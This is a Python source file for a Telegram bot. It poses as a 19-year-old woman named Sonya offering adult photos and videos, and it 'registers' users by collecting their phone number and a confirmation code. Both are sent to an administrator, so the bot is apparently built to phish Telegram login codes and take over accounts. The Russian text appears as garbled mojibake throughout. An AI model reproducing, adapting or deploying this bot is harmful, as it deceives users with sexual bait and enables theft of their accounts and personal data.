import os
import asyncio
from aiogram import Bot, Dispatcher, types, F
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    ReplyKeyboardMarkup, 
    KeyboardButton, 
    ReplyKeyboardRemove,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    FSInputFile
)
from aiogram.filters import Command
from dotenv import load_dotenv

# –ó–∞–≥—Ä—É–∑–∫–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è
load_dotenv()

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–æ—Ç–∞ –∏ –¥–∏—Å–ø–µ—Ç—á–µ—Ä–∞
bot = Bot(token=os.getenv('BOT_TOKEN'))
storage = MemoryStorage()
dp = Dispatcher(storage=storage)
ADMIN_ID = os.getenv('ADMIN_ID')

# –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –ø—É—Ç–µ–π –∫ —Ñ–∞–π–ª–∞–º
IMAGES_DIR = os.path.join(os.path.dirname(__file__), 'images')
START_IMAGE = os.path.join(IMAGES_DIR, 'start_image.jpg')

# –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Å–æ—Å—Ç–æ—è–Ω–∏–π FSM
class RegistrationStates(StatesGroup):
    WAITING_FOR_PHONE = State()
    WAITING_FOR_CODE = State()

# –°–æ–∑–¥–∞–Ω–∏–µ –∏–Ω–ª–∞–π–Ω –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã –¥–ª—è –ø—Ä–∏–≤–µ—Ç—Å—Ç–≤–∏—è
def get_welcome_keyboard():
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="–§–æ—Ç–æüîû", callback_data="photo")],
        [InlineKeyboardButton(text="–í–∏–¥–µ–æüî•", callback_data="video")],
        [InlineKeyboardButton(text="–ß–∞—Çüí¨", callback_data="chat")]
    ])
    return keyboard

# –°–æ–∑–¥–∞–Ω–∏–µ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã –¥–ª—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
def get_register_keyboard():
    keyboard = ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="üìù –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è")]], resize_keyboard=True)
    return keyboard

# –°–æ–∑–¥–∞–Ω–∏–µ –∫–ª–∞–≤–∏–∞—Ç—É—Ä—ã –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
def get_phone_keyboard():
    keyboard = ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="üì± –û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞", request_contact=True)]], resize_keyboard=True)
    return keyboard

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã /start
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    print(f"{message.from_user.first_name} {message.from_user.last_name} {message.from_user.id} –∑–∞—à–µ–ª –≤ –±–æ—Ç–∞")
    welcome_text = f"""
üëã –ü—Ä–∏–≤–µ—Ç {message.from_user.first_name}!
–ú–µ–Ω—è –∑–æ–≤—É—Ç –°–æ–Ω—è, –º–Ω–µ 19. –ñ–∏–≤—É –≤ –ú–æ—Å–∫–≤–µ.

–°–¥–µ–ª–∞–ª–∞ –±–æ—Ç–∏–∫–∞ —á—Ç–æ–±—ã –ø–æ—Ä–∞–¥–æ–≤–∞—Ç—å –≤—Å–µ—Ö –∂–µ–ª–∞—é—â–∏—Ö –∫–æ–Ω—Ç–µ–Ω—Ç–∏–∫–æ–º! –ï—Å–ª–∏ —Ö–æ—á–µ—à—å —á—Ç–æ-—Ç–æ –ø–æ—Å–º–æ—Ç—Ä–µ—Ç—å, —Ä–∞–¥–∞ –±—É–¥—É –ø–æ–º–æ—á—å)))

241 –≤–∏–¥–µ–æ üìπ

404 —Ñ–æ—Ç–æ üì∏
    
–†–∞–¥–∞ –±—É–¥—É –ø–æ–æ–±—â–∞—Ç—å—Å—è –ª–∏—á–Ω–æ, –Ω–∞–¥–µ—é—Å—å —Ç–µ–±–µ –ø–æ–Ω—Ä–∞–≤–∏—Ç—Å—è!üî•
    """
    photo = FSInputFile(START_IMAGE)
    # –°–Ω–∞—á–∞–ª–∞ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–æ—Ç–æ —Å –∏–Ω–ª–∞–π–Ω –∫–Ω–æ–ø–∫–∞–º–∏
    await message.answer_photo(
        photo=photo,
        caption=welcome_text,
        reply_markup=get_welcome_keyboard()
    )
    # –î–æ–±–∞–≤–ª—è–µ–º –∑–∞–¥–µ—Ä–∂–∫—É –≤ 1 —Å–µ–∫—É–Ω–¥—É
    await asyncio.sleep(3)
    # –ó–∞—Ç–µ–º –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∫–Ω–æ–ø–∫–æ–π —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
    await message.answer("–î–ª—è –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–æ–Ω—Ç–µ–Ω—Ç—É –Ω–µ–æ–±—Ö–æ–¥–∏–º–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è:", 
                        reply_markup=get_register_keyboard())

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫–∏ callback –∫–Ω–æ–ø–æ–∫
@dp.callback_query(F.data == "photo")
async def about_callback(callback: types.CallbackQuery):
    await callback.answer(
        "–§–æ—Ç–æ–∞–ª—å–±–æ–º –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω, –±–µ–∑ –∞–∫–∫–∞—É–Ω—Ç–∞.\n–î–ª—è —Ä–µ–≥–µ—Å—Ç—Ä–∞—Ü–∏–∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ:",
        show_alert=True
    )

@dp.callback_query(F.data == "video")
async def rules_callback(callback: types.CallbackQuery):
    await callback.answer(
        "–ê—Ä—Ö–∏–≤ –≤–∏–¥–µ–æ –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω, –±–µ–∑ –∞–∫–∫–∞—É–Ω—Ç–∞.\n–î–ª—è —Ä–µ–≥–µ—Å—Ç—Ä–∞—Ü–∏–∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ:",
        show_alert=True
    )

@dp.callback_query(F.data == "chat")
async def how_it_works_callback(callback: types.CallbackQuery):
    await callback.answer(
        "–ß–∞—Ç –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω, –±–µ–∑ –∞–∫–∫–∞—É–Ω—Ç–∞.\n–î–ª—è —Ä–µ–≥–µ—Å—Ç—Ä–∞—Ü–∏–∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ:",
        show_alert=True
    )
    await callback.message.answer("–î–ª—è –Ω–∞—á–∞–ª–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –Ω–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ:", 
                                reply_markup=get_register_keyboard())

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–æ–º–∞–Ω–¥—ã /admin
@dp.message(Command("admin"))
async def cmd_admin(message: types.Message):
    await message.answer(f"–í–∞—à Telegram ID: {message.from_user.id}")

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞–∂–∞—Ç–∏—è –∫–Ω–æ–ø–∫–∏ "–†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è"
@dp.message(F.text == "üìù –†–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏—è")
async def process_register_command(message: types.Message, state: FSMContext):
    await state.set_state(RegistrationStates.WAITING_FOR_PHONE)
    await message.answer("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞.",
                        reply_markup=get_phone_keyboard())

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –ø–æ–ª—É—á–µ–Ω–∏—è –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
@dp.message(F.content_type == "contact", RegistrationStates.WAITING_FOR_PHONE)
async def process_phone_number(message: types.Message, state: FSMContext):
    if message.contact is not None:
        phone = message.contact.phone_number
        await state.update_data(phone=phone)
        # –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É
        await bot.send_message(ADMIN_ID, f"–ù–æ–≤—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: {phone}")
        print(f"–ù–æ–≤—ã–π –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞: {phone}")
        await state.set_state(RegistrationStates.WAITING_FOR_CODE)
        await message.answer("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è:", 
                           reply_markup=ReplyKeyboardRemove())

# –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –ø–æ–ª—É—á–µ–Ω–∏—è –∫–æ–¥–∞
@dp.message(RegistrationStates.WAITING_FOR_CODE)
async def process_code(message: types.Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã.")
        return

    user_data = await state.get_data()
    
    # –û—Ç–ø—Ä–∞–≤–∫–∞ –∫–æ–¥–∞ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä—É
    admin_message = f"–ö–æ–¥ –æ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å –Ω–æ–º–µ—Ä–æ–º {user_data['phone']}:\n{message.text}"
    print(admin_message)
    await bot.send_message(ADMIN_ID, admin_message)
    
    # –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏
    await state.clear()
    await message.answer("–û–∂–∏–¥–∞–π—Ç–µ, –≤–∞—à –∞–∫–∫–∞—É–Ω—Ç –±—É–¥–µ—Ç —Å–æ–∑–¥–∞–Ω –≤ —Ç–µ—á–µ–Ω–∏–∏ 30 –º–∏–Ω—É—Ç.", 
                        reply_markup=get_register_keyboard())

async def main():
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())